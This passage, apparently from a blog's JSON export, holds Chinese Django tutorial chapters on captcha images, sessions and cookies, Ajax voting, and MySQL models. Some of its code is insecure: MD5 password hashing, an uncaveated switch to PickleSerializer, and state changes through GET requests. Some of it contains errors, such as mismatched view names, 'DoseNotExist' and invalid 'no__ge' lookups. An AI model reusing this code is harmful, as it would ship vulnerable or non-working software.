''.join(random.choices(ALL_CHARS, k=length)) 编写生成验证码图片的类Captcha。 \"\"\" 图片验证码 \"\"\" import os import random from io import BytesIO from PIL import Image from PIL import ImageFilter from PIL.ImageDraw import Draw from PIL.ImageFont import truetype class Bezier: \"\"\"贝塞尔曲线\"\"\" def __init__(self): self.tsequence = tuple([t / 20.0 for t in range(21)]) self.beziers = {} def make_bezier(self, n): \"\"\"绘制贝塞尔曲线\"\"\" try: return self.beziers[n] except KeyError: combinations = pascal_row(n - 1) result = [] for t in self.tsequence: tpowers = (t ** i for i in range(n)) upowers = ((1 - t) ** i for i in range(n - 1, -1, -1)) coefs = [c * a * b for c, a, b in zip(combinations, tpowers, upowers)] result.append(coefs) self.beziers[n] = result return result class Captcha: \"\"\"验证码\"\"\" def __init__(self, width, height, fonts=None, color=None): self._image = None self._fonts = fonts if fonts else \\ [os.path.join(os.path.dirname(__file__), 'fonts', font) for font in ['Arial.ttf', 'Georgia.ttf', 'Action.ttf']] self._color = color if color else random_color(0, 200, random.randint(220, 255)) self._width, self._height = width, height @classmethod def instance(cls, width=200, height=75): \"\"\"用于获取Captcha对象的类方法\"\"\" prop_name = f'_instance_{width}_{height}' if not hasattr(cls, prop_name): setattr(cls, prop_name, cls(width, height)) return getattr(cls, prop_name) def _background(self): \"\"\"绘制背景\"\"\" Draw(self._image).rectangle([(0, 0), self._image.size], fill=random_color(230, 255)) def _smooth(self): \"\"\"平滑图像\"\"\" return self._image.filter(ImageFilter.SMOOTH) def _curve(self, width=4, number=6, color=None): \"\"\"绘制曲线\"\"\" dx, height = self._image.size dx /= number path = [(dx * i, random.randint(0, height)) for i in range(1, number)] bcoefs = Bezier().make_bezier(number - 1) points = [] for coefs in bcoefs: points.append(tuple(sum([coef * p for coef, p in zip(coefs, ps)]) for ps in zip(*path))) Draw(self._image).line(points, fill=color if color else self._color, width=width) def _noise(self, number=50, level=2, color=None): \"\"\"绘制扰码\"\"\" width, height = self._image.size dx, dy = width / 10, height / 10 width, height = width - dx, height - dy draw = Draw(self._image) for i in range(number): x = int(random.uniform(dx, width)) y = int(random.uniform(dy, height)) draw.line(((x, y), (x + level, y)), fill=color if color else self._color, width=level) def _text(self, captcha_text, fonts, font_sizes=None, drawings=None, squeeze_factor=0.75, color=None): \"\"\"绘制文本\"\"\" color = color if color else self._color fonts = tuple([truetype(name, size) for name in fonts for size in font_sizes or (65, 70, 75)]) draw = Draw(self._image) char_images = [] for c in captcha_text: font = random.choice(fonts) c_width, c_height = draw.textsize(c, font=font) char_image = Image.new('RGB', (c_width, c_height), (0, 0, 0)) char_draw = Draw(char_image) char_draw.text((0, 0), c, font=font, fill=color) char_image = char_image.crop(char_image.getbbox()) for drawing in drawings: d = getattr(self, drawing) char_image = d(char_image) char_images.append(char_image) width, height = self._image.size offset = int((width - sum(int(i.size[0] * squeeze_factor) for i in char_images[:-1]) - char_images[-1].size[0]) / 2) for char_image in char_images: c_width, c_height = char_image.size mask = char_image.convert('L').point(lambda i: i * 1.97) self._image.paste(char_image, (offset, int((height - c_height) / 2)), mask) offset += int(c_width * squeeze_factor) @staticmethod def _warp(image, dx_factor=0.3, dy_factor=0.3): \"\"\"图像扭曲\"\"\" width, height = image.size dx = width * dx_factor dy = height * dy_factor x1 = int(random.uniform(-dx, dx)) y1 = int(random.uniform(-dy, dy)) x2 = int(random.uniform(-dx, dx)) y2 = int(random.uniform(-dy, dy)) warp_image = Image.new( 'RGB', (width + abs(x1) + abs(x2), height + abs(y1) + abs(y2))) warp_image.paste(image, (abs(x1), abs(y1))) width2, height2 = warp_image.size return warp_image.transform( (width, height), Image.QUAD, (x1, y1, -x1, height2 - y2, width2 + x2, height2 + y2, width2 - x2, -y1)) @staticmethod def _offset(image, dx_factor=0.1, dy_factor=0.2): \"\"\"图像偏移\"\"\" width, height = image.size dx = int(random.random() * width * dx_factor) dy = int(random.random() * height * dy_factor) offset_image = Image.new('RGB', (width + dx, height + dy)) offset_image.paste(image, (dx, dy)) return offset_image @staticmethod def _rotate(image, angle=25): \"\"\"图像旋转\"\"\" return image.rotate(random.uniform(-angle, angle), Image.BILINEAR, expand=1) def generate(self, captcha_text='', fmt='PNG'): \"\"\"生成验证码(文字和图片) :param captcha_text: 验证码文字 :param fmt: 生成的验证码图片格式 :return: 验证码图片的二进制数据 \"\"\" self._image = Image.new('RGB', (self._width, self._height), (255, 255, 255)) self._background() self._text(captcha_text, self._fonts, drawings=['_warp', '_rotate', '_offset']) self._curve() self._noise() self._smooth() image_bytes = BytesIO() self._image.save(image_bytes, format=fmt) return image_bytes.getvalue() def pascal_row(n=0): \"\"\"生成毕达哥拉斯三角形（杨辉三角）\"\"\" result = [1] x, numerator = 1, n for denominator in range(1, n // 2 + 1): x *= numerator x /= denominator result.append(x) numerator -= 1 if n &amp; 1 == 0: result.extend(reversed(result[:-1])) else: result.extend(reversed(result)) return result def random_color(start=0, end=255, opacity=255): \"\"\"获得随机颜色\"\"\" red = random.randint(start, end) green = random.randint(start, end) blue = random.randint(start, end) if opacity is None: return red, green, blue return red, green, blue, opacity 说明：上面的代码中用到了三个字体文件，字体文件位于polls/fonts目录下，大家可以自行添加字体文件，但是需要注意字体文件的文件名跟上面代码的第45行保持一致。 接下来，我们先完成提供验证码的视图函数。 def get_captcha(request: HttpRequest) -&gt; HttpResponse: \"\"\"验证码\"\"\" captcha_text = gen_random_code() request.session['captcha'] = captcha_text image_data = Captcha.instance().generate(captcha_text) return HttpResponse(image_data, content_type='image/png') 注意上面代码中的第4行，我们将随机生成的验证码字符串保存到session中，稍后用户登录时，我们要将保存在session中的验证码字符串和用户输入的验证码字符串进行比对，如果用户输入了正确的验证码才能够执行后续的登录流程，代码如下所示。 def login(request: HttpRequest) -&gt; HttpResponse: hint = '' if request.method == 'POST': username = request.POST.get('username') password = request.POST.get('password') if username and password: password = gen_md5_digest(password) user = User.objects.filter(username=username, password=password).first() if user: request.session['userid'] = user.no request.session['username'] = user.username return redirect('/') else: hint = '用户名或密码错误' else: hint = '请输入有效的用户名和密码' return render(request, 'login.html', {'hint': hint}) 说明：上面的代码没有对用户名和密码没有进行验证，实际项目中建议使用正则表达式验证用户输入信息，否则有可能将无效的数据交给数据库进行处理或者造成其他安全方面的隐患。 上面的代码中，我们设定了登录成功后会在session中保存用户的编号（userid）和用户名（username），页面会重定向到首页。接下来我们可以稍微对首页的代码进行调整，在页面的右上角显示出登录用户的用户名。我们将这段代码单独写成了一个名为header.html的HTML文件，首页中可以通过在&lt;body&gt;标签中添加{% include 'header.html' %}来包含这个页面，代码如下所示。 &lt;div class=\"user\"&gt; {% if request.session.userid %} &lt;span&gt;{{ request.session.username }}&lt;/span&gt; &lt;a href=\"/logout\"&gt;注销&lt;/a&gt; {% else %} &lt;a href=\"/login\"&gt;登录&lt;/a&gt;&amp;nbsp;&amp;nbsp; {% endif %} &lt;a href=\"/register\"&gt;注册&lt;/a&gt; &lt;/div&gt; 如果用户没有登录，页面会显示登录和注册的超链接；而用户登录成功后，页面上会显示用户名和注销的链接，注销链接对应的视图函数如下所示，URL的映射与之前讲过的类似，不再赘述。 def logout(request): \"\"\"注销\"\"\" request.session.flush() return redirect('/') 上面的代码通过session对象flush方法来销毁session，一方面清除了服务器上session对象保存的用户数据，一方面将保存在浏览器cookie中的sessionid删除掉，稍后我们会对如何读写cookie的操作加以说明。 我们可以通过项目使用的数据库中名为django_session 的表来找到所有的session，该表的结构如下所示： session_key session_data expire_date c9g2gt5cxo0k2evykgpejhic5ae7bfpl MmI4YzViYjJhOGMyMDJkY2M5Yzg3… 2019-05-25 23:16:13.898522 其中，第1列就是浏览器cookie中保存的sessionid；第2列是经过BASE64编码后的session中的数据，如果使用Python的base64对其进行解码，解码的过程和结果如下所示。 import base64 base64.b64decode('MmI4YzViYjJhOGMyMDJkY2M5Yzg3ZWIyZGViZmUzYmYxNzdlNDdmZjp7ImNhcHRjaGEiOiJzS3d0Iiwibm8iOjEsInVzZXJuYW1lIjoiamFja2ZydWVkIn0=') 第3列是session的过期时间，session过期后浏览器保存的cookie中的sessionid就会失效，但是数据库中的这条对应的记录仍然会存在，如果想清除过期的数据，可以使用下面的命令。 python manage.py clearsessions Django框架默认的session过期时间为两周（1209600秒），如果想修改这个时间，可以在项目的配置文件中添加如下所示的代码。 # 配置会话的超时时间为1天（86400秒） SESSION_COOKIE_AGE = 86400 有很多对安全性要求较高的应用都必须在关闭浏览器窗口时让会话过期，不再保留用户的任何信息，如果希望在关闭浏览器窗口时就让会话过期（cookie中的sessionid失效），可以加入如下所示的配置。 # 设置为True在关闭浏览器窗口时session就过期 SESSION_EXPIRE_AT_BROWSER_CLOSE = True 如果不希望将session的数据保存在数据库中，可以将其放入缓存中，对应的配置如下所示，缓存的配置和使用我们在后面讲解。 # 配置将会话对象放到缓存中存储 SESSION_ENGINE = 'django.contrib.sessions.backends.cache' # 配置使用哪一组缓存来保存会话 SESSION_CACHE_ALIAS = 'default' 如果要修改session数据默认的序列化方式，可以将默认的JSONSerializer修改为PickleSerializer。 SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer' 接下来，我们就可以限制只有登录用户才能为老师投票，修改后的praise_or_criticize函数如下所示，我们通过从request.session中获取userid来判定用户是否登录。 def praise_or_criticize(request: HttpRequest) -&gt; HttpResponse: if request.session.get('userid'): try: tno = int(request.GET.get('tno')) teacher = Teacher.objects.get(no=tno) if request.path.startswith('/praise/'): teacher.good_count += 1 count = teacher.good_count else: teacher.bad_count += 1 count = teacher.bad_count teacher.save() data = {'code': 20000, 'mesg': '投票成功', 'count': count} except (ValueError, Teacher.DoesNotExist): data = {'code': 20001, 'mesg': '投票失败'} else: data = {'code': 20002, 'mesg': '请先登录'} return JsonResponse(data) 当然，在修改了视图函数后，teachers.html也需要进行调整，用户如果没有登录，就将用户引导至登录页，登录成功再返回到投票页，此处不再赘述。 在视图函数中读写cookie下面我们对如何使用cookie做一个更为细致的说明以便帮助大家在Web项目中更好的使用这项技术。Django封装的HttpRequest和HttpResponse对象分别提供了读写cookie的操作。 HttpRequest封装的属性和方法： COOKIES属性 - 该属性包含了HTTP请求携带的所有cookie。 get_signed_cookie方法 - 获取带签名的cookie，如果签名验证失败，会产生BadSignature异常。 HttpResponse封装的方法： set_cookie方法 - 该方法可以设置一组键值对并将其最终将写入浏览器。 set_signed_cookie方法 - 跟上面的方法作用相似，但是会对cookie进行签名来达到防篡改的作用。因为如果篡改了cookie中的数据，在不知道密钥和盐的情况下是无法生成有效的签名，这样服务器在读取cookie时会发现数据与签名不一致从而产生BadSignature异常。需要说明的是，这里所说的密钥就是我们在Django项目配置文件中指定的SECRET_KEY，而盐是程序中设定的一个字符串，你愿意设定为什么都可以，只要是一个有效的字符串。 上面提到的方法，如果不清楚它们的具体用法，可以自己查阅一下Django的官方文档，没有什么资料比官方文档能够更清楚的告诉你这些方法到底如何使用。 刚才我们说过了，激活SessionMiddleware之后，每个HttpRequest对象都会绑定一个session属性，它是一个类似字典的对象，除了保存用户数据之外还提供了检测浏览器是否支持cookie的方法，包括： set_test_cookie方法 - 设置用于测试的cookie。 test_cookie_worked方法 - 检测测试cookie是否工作。 delete_test_cookie方法 - 删除用于测试的cookie。 set_expiry方法 - 设置会话的过期时间。 get_expire_age/get_expire_date方法 - 获取会话的过期时间。 clear_expired方法 - 清理过期的会话。 下面是在执行登录之前检查浏览器是否支持cookie的代码。通常情况下，浏览器默认开启了对cookie的支持，但是可能因为某种原因，用户禁用了浏览器的cookie功能，遇到这种情况我们可以在视图函数中提供一个检查功能，如果检查到用户浏览器不支持cookie，可以给出相应的提示。 def login(request): if request.method == 'POST': if request.session.test_cookie_worked(): request.session.delete_test_cookie() # Add your code to perform login process here else: return HttpResponse(\"Please enable cookies and try again.\") request.session.set_test_cookie() return render_to_response('login.html') Cookie的替代品之前我们说过了，cookie的名声一直都不怎么好，当然我们在实际开发中是不会在cookie中保存用户的敏感信息（如用户的密码、信用卡的账号等）的，而且保存在cookie中的数据一般也会做好编码和签名的工作。对于支持HTML5的浏览器来说，可以使用localStorage和sessionStorage做为cookie的替代方案，相信从名字上你就能听出二者的差别，存储在localStorage的数据可以长期保留；而存储在sessionStorage的数据会在浏览器关闭时会被清除 。关于这些cookie替代品的用法，建议大家查阅MDN来进行了解。","categories":[],"tags":[{"name":"Cookie和Session","slug":"Cookie和Session","permalink":"http://www.xiaocaibi.top/tags/Cookie%E5%92%8CSession/"}]},{"title":"43.静态资源和Ajax请求","slug":"43-静态资源和Ajax请求","date":"2021-05-29T06:08:31.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/3a6a244a.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3a6a244a.html","excerpt":"","text":"静态资源和Ajax请求加载静态资源如果要在Django项目中使用静态资源，可以先创建一个用于保存静态资源的目录。在vote项目中，我们将静态资源置于名为static的文件夹中，在该文件夹包含了三个子文件夹：css、js和images，分别用来保存外部CSS文件、外部JavaScript文件和图片资源，如下图所示。 为了能够找到保存静态资源的文件夹，我们还需要修改Django项目的配置文件settings.py，如下所示： STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static'), ] STATIC_URL = '/static/' 配置好静态资源之后，大家可以运行项目，然后看看之前我们写的页面上的图片是否能够正常加载出来。需要说明的是，在项目正式部署到线上环境后，我们通常会把静态资源交给专门的静态资源服务器（如Nginx、Apache）来处理，而不是有运行Python代码的服务器来管理静态资源，所以上面的配置并不适用于生产环境，仅供项目开发阶段测试使用。使用静态资源的正确姿势我们会在后续的章节为大家讲解。 Ajax概述接下来就可以实现“好评”和“差评”的功能了，很明显如果能够在不刷新页面的情况下实现这两个功能会带来更好的用户体验，因此我们考虑使用Ajax技术来实现“好评”和“差评”。Ajax是Asynchronous Javascript And XML的缩写 , 简单的说，使用Ajax技术可以在不重新加载整个页面的情况下对页面进行局部刷新。 对于传统的Web应用，每次页面上需要加载新的内容都需要重新请求服务器并刷新整个页面，如果服务器短时间内无法给予响应或者网络状况并不理想，那么可能会造成浏览器长时间的空白并使得用户处于等待状态，在这个期间用户什么都做不了，如下图所示。很显然，这样的Web应用并不能带来很好的用户体验。 对于使用Ajax技术的Web应用，浏览器可以向服务器发起异步请求来获取数据。异步请求不会中断用户体验，当服务器返回了新的数据，我们可以通过JavaScript代码进行DOM操作来实现对页面的局部刷新，这样就相当于在不刷新整个页面的情况下更新了页面的内容，如下图所示。 在使用Ajax技术时，浏览器跟服务器通常会交换XML或JSON格式的数据，XML是以前使用得非常多的一种数据格式，近年来几乎已经完全被JSON取代，下面是两种数据格式的对比。 XML格式： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;message&gt; &lt;from&gt;Alice&lt;/from&gt; &lt;to&gt;Bob&lt;/to&gt; &lt;content&gt;Dinner is on me!&lt;/content&gt; &lt;/message&gt; JSON格式： { \"from\": \"Alice\", \"to\": \"Bob\", \"content\": \"Dinner is on me!\" } 通过上面的对比，明显JSON格式的数据要紧凑得多，所以传输效率更高，而且JSON本身也是JavaScript中的一种对象表达式语法，在JavaScript代码中处理JSON格式的数据更加方便。 用Ajax实现投票功能下面，我们使用Ajax技术来实现投票的功能，首先修改项目的urls.py文件，为“好评”和“差评”功能映射对应的URL。 from django.contrib import admin from django.urls import path from vote import views urlpatterns = [ path('', views.show_subjects), path('teachers/', views.show_teachers), path('praise/', views.prise_or_criticize), path('criticize/', views.prise_or_criticize), path('admin/', admin.site.urls), ] 设计视图函数praise_or_criticize来支持“好评”和“差评”功能，该视图函数通过Django封装的JsonResponse类将字典序列化成JSON字符串作为返回给浏览器的响应内容。 def praise_or_criticize(request): \"\"\"好评\"\"\" try: tno = int(request.GET.get('tno')) teacher = Teacher.objects.get(no=tno) if request.path.startswith('/praise'): teacher.good_count += 1 count = teacher.good_count else: teacher.bad_count += 1 count = teacher.bad_count teacher.save() data = {'code': 20000, 'mesg': '操作成功', 'count': count} except (ValueError, Teacher.DoseNotExist): data = {'code': 20001, 'mesg': '操作失败'} return JsonResponse(data) 修改显示老师信息的模板页，引入jQuery库来实现事件处理、Ajax请求和DOM操作。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;老师信息&lt;/title&gt; &lt;style&gt; #container { width: 80%; margin: 10px auto; } .teacher { width: 100%; margin: 0 auto; padding: 10px 0; border-bottom: 1px dashed gray; overflow: auto; } .teacher&gt;div { float: left; } .photo { height: 140px; border-radius: 75px; overflow: hidden; margin-left: 20px; } .info { width: 75%; margin-left: 30px; } .info div { clear: both; margin: 5px 10px; } .info span { margin-right: 25px; } .info a { text-decoration: none; color: darkcyan; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h1&gt;{{ subject.name }}学科的老师信息&lt;/h1&gt; &lt;hr&gt; {% if not teachers %} &lt;h2&gt;暂无该学科老师信息&lt;/h2&gt; {% endif %} {% for teacher in teachers %} &lt;div class=\"teacher\"&gt; &lt;div class=\"photo\"&gt; &lt;img src=\"/static/images/{{ teacher.photo }}\" height=\"140\" alt=\"\"&gt; &lt;/div&gt; &lt;div class=\"info\"&gt; &lt;div&gt; &lt;span&gt;&lt;strong&gt;姓名：{{ teacher.name }}&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;性别：{{ teacher.sex | yesno:'男,女' }}&lt;/span&gt; &lt;span&gt;出生日期：{{ teacher.birth }}&lt;/span&gt; &lt;/div&gt; &lt;div class=\"intro\"&gt;{{ teacher.intro }}&lt;/div&gt; &lt;div class=\"comment\"&gt; &lt;a href=\"/praise/?tno={{ teacher.no }}\"&gt;好评&lt;/a&gt;&amp;nbsp;&amp;nbsp; (&lt;strong&gt;{{ teacher.good_count }}&lt;/strong&gt;) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=\"/criticize/?tno={{ teacher.no }}\"&gt;差评&lt;/a&gt;&amp;nbsp;&amp;nbsp; (&lt;strong&gt;{{ teacher.bad_count }}&lt;/strong&gt;) &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; {% endfor %} &lt;a href=\"/\"&gt;返回首页&lt;/a&gt; &lt;/div&gt; &lt;script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js\"&gt;&lt;/script&gt; &lt;script&gt; $(() =&gt; { $('.comment&gt;a').on('click', (evt) =&gt; { evt.preventDefault() let url = $(evt.target).attr('href') $.getJSON(url, (json) =&gt; { if (json.code == 20000) { $(evt.target).next().text(json.count) } else { alert(json.mesg) } }) }) }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 上面的前端代码中，使用了jQuery库封装的getJSON方法向服务器发送异步请求，如果不熟悉前端的jQuery库，可以参考《jQuery API手册》。 小结到此为止，这个投票项目的核心功能已然完成，在下面的章节中我们会要求用户必须登录才能投票，没有账号的用户可以通过注册功能注册一个账号。","categories":[],"tags":[{"name":"静态资源和Ajax请求","slug":"静态资源和Ajax请求","permalink":"http://www.xiaocaibi.top/tags/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%92%8CAjax%E8%AF%B7%E6%B1%82/"}]},{"title":"42.深入模型","slug":"42-深入模型","date":"2021-05-28T02:08:10.000Z","updated":"2021-09-20T08:47:43.916Z","comments":true,"path":"posts/13f1230a.html","link":"","permalink":"http://www.xiaocaibi.top/posts/13f1230a.html","excerpt":"","text":"深入模型在上一个章节中，我们提到了Django是基于MVC架构的Web框架，MVC架构追求的是“模型”和“视图”的解耦合。所谓“模型”说得更直白一些就是数据（的表示），所以通常也被称作“数据模型”。在实际的项目中，数据模型通常通过数据库实现持久化操作，而关系型数据库在过去和当下都是持久化的首选方案，下面我们通过完成一个投票项目来讲解和模型相关的知识点。投票项目的首页会展示某在线教育平台所有的学科；点击学科可以查看到该学科的老师及其信息；用户登录后在查看老师的页面为老师投票，可以投赞成票和反对票；未登录的用户可以通过登录页进行登录；尚未注册的用户可以通过注册页输入个人信息进行注册。在这个项目中，我们使用MySQL数据库来实现数据持久化操作。 创建项目和应用我们首先创建Django项目vote并为其添加虚拟环境和依赖项。接下来，在项目下创建名为polls的应用和保存模板页的文件夹tempaltes，项目文件夹的结构如下所示。 根据上面描述的项目需求，我们准备了四个静态页面，分别是展示学科的页面subjects.html，显示学科老师的页面teachers.html，登录页面login.html，注册页面register.html，稍后我们会将静态页修改为Django项目所需的模板页。 配置关系型数据库MySQL 在MySQL中创建数据库，创建用户，授权用户访问该数据库。 create database vote default charset utf8; create user 'hellokitty'@'%' identified by 'Hellokitty.618'; grant all privileges on vote.* to 'hellokitty'@'%'; flush privileges; 在MySQL中创建保存学科和老师信息的二维表（保存用户信息的表稍后处理）。 use vote; -- 创建学科表 create table `tb_subject` ( `no` integer auto_increment comment '学科编号', `name` varchar(50) not null comment '学科名称', `intro` varchar(1000) not null default '' comment '学科介绍', `is_hot` boolean not null default 0 comment '是不是热门学科', primary key (`no`) ); -- 创建老师表 create table `tb_teacher` ( `no` integer auto_increment comment '老师编号', `name` varchar(20) not null comment '老师姓名', `sex` boolean not null default 1 comment '老师性别', `birth` date not null comment '出生日期', `intro` varchar(1000) not null default '' comment '老师介绍', `photo` varchar(255) not null default '' comment '老师照片', `gcount` integer not null default 0 comment '好评数', `bcount` integer not null default 0 comment '差评数', `sno` integer not null comment '所属学科', primary key (`no`), foreign key (`sno`) references `tb_subject` (`no`) ); 在虚拟环境中安装连接MySQL数据库所需的依赖项。 pip install mysqlclient 说明：如果因为某些原因无法安装mysqlclient三方库，可以使用它的替代品pymysql，pymysql是用纯Python开发的连接MySQL的Python库，安装更容易成功，但是需要在Django项目文件夹的__init__.py中添加如下所示的代码。 import pymysql pymysql.install_as_MySQLdb() 如果使用Django 2.2及以上版本，还会遇到PyMySQL跟Django框架的兼容性问题，兼容性问题会导致项目无法运行，需要按照GitHub上PyMySQL仓库Issues中提供的方法进行处理。总体来说，使用pymysql会比较麻烦，强烈建议大家首选安装mysqlclient。 修改项目的settings.py文件，首先将我们创建的应用polls添加已安装的项目（INSTALLED_APPS）中，然后配置MySQL作为持久化方案。 INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'polls', ] DATABASES = { 'default': { # 数据库引擎配置 'ENGINE': 'django.db.backends.mysql', # 数据库的名字 'NAME': 'vote', # 数据库服务器的IP地址（本机可以写localhost或127.0.0.1） 'HOST': 'localhost', # 启动MySQL服务的端口号 'PORT': 3306, # 数据库用户名和口令 'USER': 'hellokitty', 'PASSWORD': 'Hellokitty.618', # 数据库使用的字符集 'CHARSET': 'utf8', # 数据库时间日期的时区设定 'TIME_ZONE': 'Asia/Chongqing', } } 在配置ENGINE属性时，常用的可选值包括： 'django.db.backends.sqlite3'：SQLite嵌入式数据库。 'django.db.backends.postgresql'：BSD许可证下发行的开源关系型数据库产品。 'django.db.backends.mysql'：甲骨文公司经济高效的数据库产品。 'django.db.backends.oracle'：甲骨文公司关系型数据库旗舰产品。 其他的配置可以参考官方文档中数据库配置的部分。 Django框架提供了ORM来解决数据持久化问题，ORM翻译成中文叫“对象关系映射”。因为Python是面向对象的编程语言，我们在Python程序中使用对象模型来保存数据，而关系型数据库使用关系模型，用二维表来保存数据，这两种模型并不匹配。使用ORM是为了实现对象模型到关系模型的双向转换，这样就不用在Python代码中书写SQL语句和游标操作，因为这些都会由ORM自动完成。利用Django的ORM，我们可以直接将刚才创建的学科表和老师表变成Django中的模型类。 python manage.py inspectdb &gt; polls/models.py 我们可以对自动生成的模型类稍作调整，代码如下所示。 from django.db import models class Subject(models.Model): no = models.AutoField(primary_key=True, verbose_name='编号') name = models.CharField(max_length=50, verbose_name='名称') intro = models.CharField(max_length=1000, verbose_name='介绍') is_hot = models.BooleanField(verbose_name='是否热门') class Meta: managed = False db_table = 'tb_subject' class Teacher(models.Model): no = models.AutoField(primary_key=True, verbose_name='编号') name = models.CharField(max_length=20, verbose_name='姓名') sex = models.BooleanField(default=True, verbose_name='性别') birth = models.DateField(verbose_name='出生日期') intro = models.CharField(max_length=1000, verbose_name='个人介绍') photo = models.ImageField(max_length=255, verbose_name='照片') good_count = models.IntegerField(default=0, db_column='gcount', verbose_name='好评数') bad_count = models.IntegerField(default=0, db_column='bcount', verbose_name='差评数') subject = models.ForeignKey(Subject, models.DO_NOTHING, db_column='sno') class Meta: managed = False db_table = 'tb_teacher' 说明：模型类都直接或间接继承自Model类，模型类跟关系型数据库的二维表对应，模型对象跟表中的记录对应，模型对象的属性跟表中的字段对应。如果对上面模型类的属性定义不是特别理解，可以看看本文后面提供的“模型定义参考”部分的内容。 使用ORM完成模型的CRUD操作有了Django框架的ORM，我们可以直接使用面向对象的方式来实现对数据的CRUD（增删改查）操作。我们可以在PyCharm的终端中输入下面的命令进入到Django项目的交互式环境，然后尝试对模型的操作。 python manage.py shell 新增from polls.models import Subject subject1 = Subject(name='Python全栈开发', intro='当下最热门的学科', is_hot=True) subject1.save() subject2 = Subject(name='全栈软件测试', intro='学习自动化测试的学科', is_hot=False) subject2.save() subject3 = Subject(name='JavaEE分布式开发', intro='基于Java语言的服务器应用开发', is_hot=True) 删除subject = Subject.objects.get(no=2) subject.delete() 更新subject = Subject.objects.get(no=1) subject.name = 'Python全栈+人工智能' subject.save() 查询 查询所有对象。 Subjects.objects.all() 过滤数据。 # 查询名称为“Python全栈+人工智能”的学科 Subject.objects.filter(name='Python全栈+人工智能') # 查询名称包含“全栈”的学科（模糊查询） Subject.objects.filter(name__contains='全栈') Subject.objects.filter(name__startswith='全栈') Subject.objects.filter(name__endswith='全栈') # 查询所有热门学科 Subject.objects.filter(is_hot=True) # 查询编号大于3小于10的学科 Subject.objects.filter(no__gt=3).filter(no__lt=10) Subject.objects.filter(no__gt=3, no__lt=10) # 查询编号在3到7之间的学科 Subject.objects.filter(no__ge=3, no__le=7) Subject.objects.filter(no__range=(3, 7)) 查询单个对象。 # 查询主键为1的学科 Subject.objects.get(pk=1) Subject.objects.get(no=1) Subject.objects.filter(no=1).first() Subject.objects.filter(no=1).last() 排序。 # 查询所有学科按编号升序排列 Subject.objects.order_by('no') # 查询所有部门按部门编号降序排列 Subject.objects.order_by('-no') 切片（分页查询）。 # 按编号从小到大查询前3个学科 Subject.objects.order_by('no')[:3] 计数。 # 查询一共有多少个学科 Subject.objects.count() 高级查询。 # 查询编号为1的学科的老师 Teacher.objects.filter(subject__no=1) Subject.objects.get(pk=1).teacher_set.all() # 查询学科名称有“全栈”二字的学科的老师 Teacher.objects.filter(subject__name__contains='全栈') 说明1：由于老师与学科之间存在多对一外键关联，所以能通过学科反向查询到该学科的老师（从一对多关系中“一”的一方查询“多”的一方），反向查询属性默认的名字是类名小写_set（如上面例子中的teacher_set），当然也可以在创建模型时通过ForeingKey的related_name属性指定反向查询属性的名字。如果不希望执行反向查询可以将related_name属性设置为'+'或者以'+'开头的字符串。 说明2：ORM查询多个对象时会返回QuerySet对象，QuerySet使用了惰性查询，即在创建QuerySet对象的过程中不涉及任何数据库活动，等真正用到对象时（对QuerySet求值）才向数据库发送SQL语句并获取对应的结果，这一点在实际开发中需要引起注意！ 说明3：如果希望更新多条数据，不用先逐一获取模型对象再修改对象属性，可以直接使用QuerySet对象的update()方法一次性更新多条数据。 利用Django后台管理模型在创建好模型类之后，可以通过Django框架自带的后台管理应用（admin应用）实现对模型的管理。虽然实际应用中，这个后台可能并不能满足我们的需求，但是在学习Django框架时，我们可以利用admin应用来管理我们的模型，同时也通过它来了解一个项目的后台管理系统需要哪些功能。使用Django自带的admin应用步骤如下所示。 将admin应用所需的表迁移到数据库中。admin应用本身也需要数据库的支持，而且在admin应用中已经定义好了相关的数据模型类，我们只需要通过模型迁移操作就能自动在数据库中生成所需的二维表。 python manage.py migrate 创建访问admin应用的超级用户账号，这里需要输入用户名、邮箱和口令。 python manage.py createsuperuser 说明：输入口令时没有回显也不能退格，需要一气呵成完成输入。 运行项目，在浏览器中访问http://127.0.0.1:8000/admin，输入刚才创建的超级用户账号和密码进行登录。 登录后进入管理员操作平台。 注意，我们暂时还没能在admin应用中看到之前创建的模型类，为此需要在polls应用的admin.py文件中对需要管理的模型进行注册。 注册模型类。 from django.contrib import admin from polls.models import Subject, Teacher admin.site.register(Subject) admin.site.register(Teacher) 注册模型类后，就可以在后台管理系统中看到它们。 对模型进行CRUD操作。 可以在管理员平台对模型进行C（新增）、R（查看）、U（更新）、D（删除）操作，如下图所示。 添加学科。 查看所有学科。 删除和更新学科。 注册模型管理类。 可能大家已经注意到了，刚才在后台查看部门信息的时候，显示的部门信息并不直观，为此我们再修改admin.py文件，通过注册模型管理类，可以在后台管理系统中更好的管理模型。 from django.contrib import admin from polls.models import Subject, Teacher class SubjectModelAdmin(admin.ModelAdmin): list_display = ('no', 'name', 'intro', 'is_hot') search_fields = ('name', ) ordering = ('no', ) class TeacherModelAdmin(admin.ModelAdmin): list_display = ('no', 'name', 'sex', 'birth', 'good_count', 'bad_count', 'subject') search_fields = ('name', ) ordering = ('no', ) admin.site.register(Subject, SubjectModelAdmin) admin.site.register(Teacher, TeacherModelAdmin) 为了更好的查看模型，我们为Subject类添加__str__魔法方法，并在该方法中返回学科名字。这样在如上图所示的查看老师的页面上显示老师所属学科时，就不再是Subject object(1)这样晦涩的信息，而是学科的名称。 实现学科页和老师页效果 修改polls/views.py文件，编写视图函数实现对学科页和老师页的渲染。 from django.shortcuts import render, redirect from polls.models import Subject, Teacher def show_subjects(request): subjects = Subject.objects.all().order_by('no') return render(request, 'subjects.html', {'subjects': subjects}) def show_teachers(request): try: sno = int(request.GET.get('sno')) teachers = [] if sno: subject = 